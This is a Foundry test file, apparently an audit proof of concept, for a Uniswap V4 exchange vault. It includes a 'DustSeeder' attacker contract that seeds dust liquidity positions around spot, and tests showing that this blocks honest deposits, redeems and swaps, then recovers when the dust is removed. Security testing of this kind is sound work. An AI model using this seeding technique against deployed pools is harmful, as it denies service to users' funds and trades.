// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v4/fullSpread/hookless/test/bases/TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault.sol";
import {ERC20PermitMintableStub} from "@crane/contracts/tokens/ERC20/ERC20PermitMintableStub.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/callback/IUnlockCallback.sol";
import {IHooks} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IHooks.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {PoolIdLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolId.sol";
import {Currency} from "@crane/contracts/protocols/dexes/uniswap/v4/types/Currency.sol";
import {BalanceDelta, BalanceDeltaLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/BalanceDelta.sol";
import {ModifyLiquidityParams} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolOperation.sol";
import {TickMath} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/TickMath.sol";
import {StateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/StateLibrary.sol";
import {IStandardExchangeProxy} from "contracts/interfaces/proxies/IStandardExchangeProxy.sol";
import {IStandardExchangeInMulti} from "contracts/interfaces/IStandardExchangeInMulti.sol";

/// Unprivileged attacker: mints/burns liquidity-1 one-spacing positions directly on the PoolManager.
contract DustSeeder is IUnlockCallback {
    using BalanceDeltaLibrary for BalanceDelta;
    IPoolManager immutable pm;
    PoolKey key;
    int24 lo; int24 n; int256 sign;

    constructor(IPoolManager pm_, PoolKey memory k) { pm = pm_; key = k; }

    function seed(int24 startTick, int24 count, bool add) external {
        lo = startTick; n = count; sign = add ? int256(1) : int256(-1);
        pm.unlock("");
    }

    function unlockCallback(bytes calldata) external returns (bytes memory) {
        require(msg.sender == address(pm));
        int24 s = key.tickSpacing;
        int256 d0; int256 d1;
        for (int24 i; i < n; ++i) {
            (BalanceDelta d,) = pm.modifyLiquidity(key, ModifyLiquidityParams(lo + i * s, lo + (i + 1) * s, sign, bytes32(0)), "");
            d0 += d.amount0(); d1 += d.amount1();
        }
        _settle(key.currency0, d0); _settle(key.currency1, d1);
        return "";
    }

    function _settle(Currency c, int256 d) internal {
        if (d < 0) { pm.sync(c); IERC20(Currency.unwrap(c)).transfer(address(pm), uint256(-d)); pm.settle(); }
        else if (d > 0) pm.take(c, address(this), uint256(d));
    }
}

contract FsDustTickCapTest is TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault, IUnlockCallback {
    using BalanceDeltaLibrary for BalanceDelta;
    using PoolIdLibrary for PoolKey;

    IStandardExchangeProxy internal vault;
    PoolKey internal poolKey;
    IERC20 internal token0;
    IERC20 internal token1;
    DustSeeder internal attacker;
    address internal constant BOB = address(0xB0B);
    address internal constant ATK = address(0xA77AC4E5);

    function _spacing() internal pure virtual returns (int24) { return 1; }
    function _fee() internal pure virtual returns (uint24) { return 100; }
    function _dustPerSide() internal pure virtual returns (int24) { return 300; }

    function setUp() public virtual override {
        super.setUp();
        ERC20PermitMintableStub a = new ERC20PermitMintableStub("Pair A", "A", 18, address(this), 1e32);
        ERC20PermitMintableStub b = new ERC20PermitMintableStub("Pair B", "B", 18, address(this), 1e32);
        bool ordered = address(a) < address(b);
        token0 = IERC20(ordered ? address(a) : address(b));
        token1 = IERC20(ordered ? address(b) : address(a));
        poolKey = PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)), _fee(), _spacing(), IHooks(address(0)));
        poolManager.initialize(poolKey, uint160(1 << 96));
        poolManager.unlock(abi.encode(uint128(2_000e18))); // honest external full-range LP
        vault = IStandardExchangeProxy(uniswapV4StandardExchangeDFPkg.deployVault(poolKey));
        token0.approve(address(vault), type(uint256).max);
        token1.approve(address(vault), type(uint256).max);
        address[] memory toks = new address[](2); toks[0] = address(token0); toks[1] = address(token1);
        uint256[] memory amts = new uint256[](2); amts[0] = 10_000e18; amts[1] = 10_000e18;
        IStandardExchangeInMulti(address(vault)).exchangeInManyToOne(toks, amts, IERC20(address(vault)), 0, address(this), false, block.timestamp);

        token0.transfer(BOB, 1_000e18); token1.transfer(BOB, 1_000e18);
        vm.startPrank(BOB, BOB);
        token0.approve(address(vault), type(uint256).max); token1.approve(address(vault), type(uint256).max);
        vm.stopPrank();

        attacker = new DustSeeder(poolManager, poolKey);
        token0.transfer(address(attacker), 1e6); token1.transfer(address(attacker), 1e6); // a few wei needed
        vm.roll(block.number + 1); vm.warp(block.timestamp + 12);
    }

    function unlockCallback(bytes calldata data_) external returns (bytes memory) {
        uint128 liq = abi.decode(data_, (uint128));
        int24 s = _spacing();
        (BalanceDelta delta,) = poolManager.modifyLiquidity(poolKey, ModifyLiquidityParams(
            TickMath.minUsableTick(s), TickMath.maxUsableTick(s), int256(uint256(liq)), bytes32(0)), "");
        if (delta.amount0() < 0) { poolManager.sync(poolKey.currency0); token0.transfer(address(poolManager), uint128(-delta.amount0())); poolManager.settle(); }
        if (delta.amount1() < 0) { poolManager.sync(poolKey.currency1); token1.transfer(address(poolManager), uint128(-delta.amount1())); poolManager.settle(); }
        return "";
    }

    // ---- honest operations (each run from a snapshot; returns success + revert data) ----
    function _zapDeposit(uint256 amt) internal returns (bool ok, bytes memory err) {
        vm.prank(BOB, BOB);try vault.exchangeIn(token0, amt, IERC20(address(vault)), 0, BOB, false, block.timestamp) returns (uint256 s, uint256) {
            ok = true; console2.log("  zap deposit shares", s);
        } catch (bytes memory e) { err = e; }
    }
    function _zapRedeem(uint256 shares) internal returns (bool ok, bytes memory err) {try vault.exchangeIn(IERC20(address(vault)), shares, token0, 0, address(this), false, block.timestamp) returns (uint256 o, uint256) {
            ok = true; console2.log("  zap redeem token0 out", o);
        } catch (bytes memory e) { err = e; }
    }
    function _swapIn(uint256 amt) internal returns (bool ok, bytes memory err) {
        vm.prank(BOB, BOB);try vault.exchangeIn(token0, amt, token1, 0, BOB, false, block.timestamp) returns (uint256 o, uint256) {
            ok = true; console2.log("  exact-in swap out", o);
        } catch (bytes memory e) { err = e; }
    }
    function _swapOut(uint256 out) internal returns (bool ok, bytes memory err) {
        vm.prank(BOB, BOB);
        try vault.exchangeOut(token0, type(uint256).max, token1, out, BOB, false, block.timestamp) returns (uint256 i) {
            ok = true; console2.log("  exact-out swap in", i);
        } catch (bytes memory e) { err = e; }
    }

    uint256 internal ZAP = 5e18;
    uint256 internal OUT = 1e15;
    struct Res { bool dep; bool red; bool sin; bool sout; }

    function _runAll(string memory tag) internal returns (Res memory r) {
        console2.log(tag);
        uint256 redeemShares = vault.balanceOf(address(this)) / 100; // 1% of victim's holding
        bytes memory e;
        uint256 snap = vm.snapshotState();
        (r.dep, e) = _zapDeposit(ZAP); if (!r.dep) { console2.log("  zap deposit REVERT"); console2.logBytes(e); }
        vm.revertToState(snap);
        (r.red, e) = _zapRedeem(redeemShares); if (!r.red) { console2.log("  zap redeem REVERT"); console2.logBytes(e); }
        vm.revertToState(snap);
        (r.sin, e) = _swapIn(100e18); if (!r.sin) { console2.log("  exact-in swap REVERT"); console2.logBytes(e); }
        vm.revertToState(snap);
        (r.sout, e) = _swapOut(OUT); if (!r.sout) { console2.log("  exact-out swap REVERT"); console2.logBytes(e); }
        vm.revertToState(snap);
    }

    function test_sweep() public {
        uint256[7] memory z = [uint256(1e18), 5e18, 20e18, 50e18, 100e18, 200e18, 300e18];
        for (uint256 i; i < 7; ++i) { uint256 sn = vm.snapshotState(); (bool ok,) = _zapDeposit(z[i]); console2.log("zap", z[i], ok); vm.revertToState(sn); }
        uint256[6] memory o = [uint256(1e15), 1e16, 1e17, 1e18, 2e18, 5e18];
        for (uint256 i; i < 6; ++i) { uint256 sn = vm.snapshotState(); (bool ok,) = _swapOut(o[i]); console2.log("out", o[i], ok); vm.revertToState(sn); }
    }

    function test_whichTick() public {
        int24 s = _spacing();
        int24[2][5] memory pos = [[int24(1), int24(2)], [int24(-1), int24(0)], [int24(-2), int24(-1)], [int24(-11), int24(-10)], [int24(10), int24(11)]];
        for (uint256 i; i < 5; ++i) {
            uint256 sn = vm.snapshotState();
            vm.prank(ATK, ATK); attacker.seed(pos[i][0] * s, 1, true);
            (bool a,) = _zapDeposit(1e18);
            (bool b,) = _zapDeposit(5e18);
            vm.prank(BOB, BOB);
            (bool c,) = address(vault).call(abi.encodeCall(vault.exchangeIn, (token1, 1e18, IERC20(address(vault)), 0, BOB, false, block.timestamp)));
            console2.log("dust lower tick (spacings)", int256(pos[i][0]));
            console2.log("   zap0 1e18 / zap0 5e18 / zap1 1e18", a, b, c);
            vm.revertToState(sn);
        }
    }

    function test_minDust() public {
        int24 s = _spacing();
        (, int24 tick,,) = StateLibrary.getSlot0(poolManager, poolKey.toId());
        int24 base = (tick / s) * s;
        int24[6] memory ns = [int24(1), 4, 16, 32, 63, 65];
        for (uint256 i; i < 6; ++i) {
            uint256 sn = vm.snapshotState();
            vm.startPrank(ATK, ATK);
            attacker.seed(base + s, ns[i], true); attacker.seed(base - ns[i] * s, ns[i], true);
            vm.stopPrank();
            (bool a,) = _zapDeposit(1e18);
            (bool b,) = _zapDeposit(5e18);
            (bool c,) = _swapIn(100e18);
            console2.log("n per side", uint256(int256(ns[i])));
            console2.log("   zap1e18 / zap5e18 / swapIn100e18", a, b, c);
            vm.revertToState(sn);
        }
    }

    function test_dustTickSeedingDoS() public {
        int24 s = _spacing();
        (, int24 tick,,) = StateLibrary.getSlot0(poolManager, poolKey.toId());
        Res memory pre = _runAll("== baseline (no dust)");
        assertTrue(pre.dep && pre.red && pre.sin, "baseline ops must succeed"); assertFalse(pre.sout, "exact-out already unavailable at baseline");

        uint256 a0 = token0.balanceOf(address(attacker)); uint256 a1 = token1.balanceOf(address(attacker));
        int24 base = (tick / s) * s;
        int24 n = _dustPerSide();
        // attacker (unprivileged EOA via its contract): n dust positions above and n below spot, in chunks
        vm.startPrank(ATK, ATK);
        for (int24 off; off < n; off += 100) {
            int24 c = n - off < 100 ? n - off : int24(100);
            attacker.seed(base + s + off * s, c, true);             // above spot
            attacker.seed(base - (off + c) * s, c, true);           // below spot
        }
        vm.stopPrank();
        uint256 cost0 = a0 - token0.balanceOf(address(attacker)); uint256 cost1 = a1 - token1.balanceOf(address(attacker));
        console2.log("attacker token cost wei token0/token1", cost0, cost1);

        Res memory post = _runAll("== after dust seeding");
        console2.log("POST dep/red/sin", post.dep, post.red, post.sin);
        {
            uint256 sn = vm.snapshotState(); (bool ok,) = _zapDeposit(1e18); console2.log("POST zap 1e18", ok); vm.revertToState(sn);
            sn = vm.snapshotState(); (ok,) = _swapIn(1e18); console2.log("POST swapIn 1e18", ok); vm.revertToState(sn);
            sn = vm.snapshotState(); (ok,) = _swapIn(10e18); console2.log("POST swapIn 10e18", ok); vm.revertToState(sn);
            sn = vm.snapshotState(); (ok,) = _zapRedeem(vault.balanceOf(address(this)) / 1000); console2.log("POST redeem 0.1%", ok); vm.revertToState(sn);
        }

        // proportional dual exit still works (funds not frozen)
        {
            uint256 snap = vm.snapshotState();
            address[] memory toks = new address[](2); toks[0] = address(token0); toks[1] = address(token1);
            uint256[] memory amts = new uint256[](2); amts[0] = 100e18; amts[1] = 100e18;
            vm.prank(BOB, BOB);
            uint256 sh = IStandardExchangeInMulti(address(vault)).exchangeInManyToOne(toks, amts, IERC20(address(vault)), 0, BOB, false, block.timestamp);
            console2.log("dual deposit still works, shares", sh);
            vm.revertToState(snap);
        }

        // attacker removes dust -> everything works again (causality)
        vm.startPrank(ATK, ATK);
        for (int24 off; off < n; off += 100) {
            int24 c = n - off < 100 ? n - off : int24(100);
            attacker.seed(base + s + off * s, c, false);
            attacker.seed(base - (off + c) * s, c, false);
        }
        vm.stopPrank();
        Res memory after_ = _runAll("== after dust removal");
        assertTrue(after_.dep && after_.red && after_.sin, "ops restored after removal");
    }
}

/// tickSpacing 10 / fee 500
contract FsDustTickCapSpacing10Test is FsDustTickCapTest {
    function _spacing() internal pure override returns (int24) { return 10; }
    function _fee() internal pure override returns (uint24) { return 500; }
    function _dustPerSide() internal pure override returns (int24) { return 300; }
}
